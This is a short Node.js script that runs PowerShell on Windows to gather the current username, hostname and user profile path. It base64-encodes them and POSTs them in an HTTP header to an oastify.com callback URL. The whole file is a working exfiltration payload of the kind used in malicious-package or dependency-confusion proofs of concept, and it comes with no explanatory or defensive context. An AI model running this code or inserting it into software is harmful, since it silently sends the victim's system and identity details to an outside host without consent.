const { exec } = require('child_process');

const callback = 'https://sample-id.oastify.com/windows-exfil';
const command = `
  $user = whoami;
  $host = hostname;
  $profile = $Env:USERPROFILE;
  $data = "$user|$host|$profile";
  $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data));
  curl -X POST "${callback}" -H "X-Data: $b64" -s -o NUL
`;

exec(command, { shell: 'powershell.exe' });
